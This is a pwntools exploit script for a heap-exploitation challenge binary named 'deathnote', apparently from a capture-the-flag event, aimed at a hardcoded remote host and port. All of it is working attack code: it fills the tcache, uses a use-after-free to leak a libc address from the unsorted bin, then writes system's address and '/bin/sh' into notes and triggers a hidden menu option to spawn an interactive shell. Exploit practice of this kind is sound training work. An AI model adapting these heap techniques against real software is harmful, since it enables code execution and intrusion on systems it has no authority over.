from pwn import *

exe = ELF("deathnote_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65']
warnings.simplefilter("ignore")

remote_url = "83.136.249.57"
remote_port = 30276
gdbscript = '''
b *_+296
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'\xf0\x9f\x92\x80 '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def add(sz, idx, val):
    menu(1)
    sla(menu_delim, sn(sz))
    sla(menu_delim, sn(idx))
    sla(menu_delim, val)

def delete(idx):
    menu(2)
    sla(menu_delim, sn(idx))

def show(idx):
    menu(3)
    sla(menu_delim, sn(idx))
    r.recvuntil(b'content: ')
    return r.recvline().strip()

# Allocate 9 chunks
for i in range(9):
    info(f'add-{i}')
    add(0x80, i, b'/bin/sh\x00')

# Fulfill tcache
for i in range(7):
    info(f'del-{i}')
    delete(i)

# This free will put the freed chunk to unsorted bin
info(f'del-{7}')
delete(7)

# With the UAF bug, use `show()` to get a libc leak
info(f'leak...')
libc.address = u64(show(7)[:6].ljust(8, b'\x00')) - (libc.symbols['main_arena']+96)
logleak('libc.address', libc.address)
logleak('system', libc.sym.system)

# Setup pages[0] and pages[1], then trigger the `_` func
add(0x50, 0, hex(libc.sym.system)[2:].encode())
add(0x50, 1, b'/bin/sh\x00')

# Execute pages[0](pages[1])
menu(42)

r.interactive()

